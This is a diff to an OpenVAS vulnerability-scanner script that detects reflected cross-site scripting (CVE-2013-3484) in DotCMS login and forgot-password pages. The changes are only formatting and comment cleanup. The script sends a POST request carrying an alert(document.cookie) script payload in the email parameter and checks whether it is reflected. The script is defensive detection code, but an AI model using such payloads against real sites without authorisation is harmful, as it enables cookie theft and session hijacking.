@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_dotcms_login_mult_xss_vuln.nasl 5820 2017-03-31 11:20:49Z cfi $
+# $Id: gb_dotcms_login_mult_xss_vuln.nasl 11194 2018-09-03 12:44:14Z mmartin $
 #
 # DotCMS Multiple Login Page Cross Site Scripting Vulnerabilities
 #
@@ -27,32 +27,32 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804294");
-  script_version("$Revision: 5820 $");
+  script_version("$Revision: 11194 $");
   script_cve_id("CVE-2013-3484");
   script_bugtraq_id(60741);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-03-31 13:20:49 +0200 (Fri, 31 Mar 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-03 14:44:14 +0200 (Mon, 03 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-05-13 16:14:20 +0530 (Tue, 13 May 2014)");
   script_name("DotCMS Multiple Login Page Cross Site Scripting Vulnerabilities");
 
-  script_tag(name : "summary" , value : "This host is installed with DotCMS and is prone to multiple cross-site
+  script_tag(name:"summary", value:"This host is installed with DotCMS and is prone to multiple cross-site
   scripting vulnerabilities.");
-  script_tag(name : "vuldetect" , value : "Send a crafted data via HTTP GET request and check whether it is able to read
+  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
   cookie or not.");
-  script_tag(name : "insight" , value : "The flaw is due to an improper sanitization of Input passed via '_loginUserName',
+  script_tag(name:"insight", value:"The flaw is due to an improper sanitization of Input passed via '_loginUserName',
   'my_account_login', 'email' POST parameters to /application/login/login.html,
   /c/portal_public/login and /dotCMS/forgotPassword scripts respectively.");
-  script_tag(name : "impact" , value : "Successful exploitation will allow attacker to execute arbitrary HTML and
+  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
   script code in a user's browser session in the context of an affected site.
 
   Impact Level: Application");
-  script_tag(name : "affected" , value : "DotCMS before version 2.3.2");
-  script_tag(name : "solution" , value : "Upgrade to DotCMS version 2.3.2 or later.
+  script_tag(name:"affected", value:"DotCMS before version 2.3.2");
+  script_tag(name:"solution", value:"Upgrade to DotCMS version 2.3.2 or later.
   For updates refer to http://dotcms.com/");
 
-  script_xref(name : "URL" , value : "http://dotcms.com/security/SI-14");
-  script_xref(name : "URL" , value : "http://dotcms.com/downloads/release-notes.dot");
+  script_xref(name:"URL", value:"http://dotcms.com/security/SI-14");
+  script_xref(name:"URL", value:"http://dotcms.com/downloads/release-notes.dot");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
   script_family("Web application abuses");
@@ -69,31 +69,20 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Variable Initialization
-http_port = 0;
-dir = "";
-url = "";
-sndReq = "";
-rcvRes = "";
-
 http_port = get_http_port(default:80);
 
 host = http_host_name(port:http_port);
 
-## Iterate over possible paths
 foreach dir (make_list_unique("/", "/dotcms", "/cms", cgi_dirs(port:http_port)))
 {
 
   if(dir == "/") dir = "";
 
-  ## Construct GET Request
   sndReq = http_get(item:string(dir, "/application/login/login.html"), port:http_port);
   rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-  ## confirm the application
   if(rcvRes && 'href="/dotCMS' >< rcvRes)
   {
-    ## Construct the attack requuest
     postdata = 'dispatch=forgotPassword&reset_password=true&email="><script>ale' +
                'rt(document.cookie);</script>';
 
@@ -103,10 +92,8 @@ foreach dir (make_list_unique("/", "/dotcms", "/cms", cgi_dirs(port:http_port)))
                     "Content-Length: ", strlen(postdata), "\r\n\r\n",
                     postdata);
 
-    ## Send request and receive the response
     rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-    ## Confirm the exploit
     if(rcvRes =~ "HTTP/1\.. 200" && "<script>alert(document.cookie);</script>" >< rcvRes &&
       "dotCMS" >< rcvRes)
     {
